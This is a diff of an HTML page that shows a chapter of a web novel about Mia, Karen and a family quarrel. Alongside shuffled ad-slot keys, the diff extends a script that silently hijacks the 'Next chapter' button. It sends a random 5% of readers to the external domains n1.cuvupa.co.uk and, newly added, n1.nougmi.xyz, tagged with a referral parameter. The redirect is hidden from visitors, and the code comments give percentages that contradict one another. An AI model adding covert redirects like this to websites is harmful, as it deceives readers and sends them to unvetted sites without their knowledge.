@@ -2395,7 +2395,7 @@
                 <p>wealthy backgrounds, unlike Sally. Have you no sense of shame?”</p>
                 <p>“Fine. I guess I’m just an unwanted guest here, right? I’ll go.”</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>Frustrated, Karen slammed her hand on the table and rose to leave. Patricia quickly reached out to</p>
                 <p>restrain her. “Karen, please don’t be upset.”</p>
                 <p>“Patricia, Mia’s family is overstepping their bounds. Despite our financial struggles, we were the ones</p>
@@ -2415,7 +2415,7 @@
                 <p>If they didn’t establish boundaries now, Mia feared Edna and Karen would only become more audacious.</p>
                 <p>and troublesome in the future.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Edna gestured dismissively. “Oh, don’t mind her, that’s just her temper.”</p>
                 <p>As Karen reached the door, nobody attempted to stop her or convince her to stay.</p>
                 <p>Faced with the embarrassment of returning, she stormed out of the room In a fit of frustration,</p>
@@ -2435,7 +2435,7 @@
                 <p>Upon hearing the familiar voice, Mia hesitated to intervene, but Patricia had already recognized the</p>
                 <p>person.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>As she approached, Patricia found Karen standing before an elegantly dressed woman, Regina Lawson,</p>
                 <p>wearing an apologetic expression.</p>
                 <p>Tears welled up in Karen’s eyes as she spotted Patricia.</p>
@@ -2448,7 +2448,7 @@
                 <p>Turning to Mia with pleading eyes, Karen Implored, “Mia, please help me.”</p>
                 <p>Mia’s patience was wearing thin; It seemed Edna and Karen were simply troublemakers.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
             </div>
             
             <div class="font-controls">
@@ -2570,7 +2570,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2586,8 +2586,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
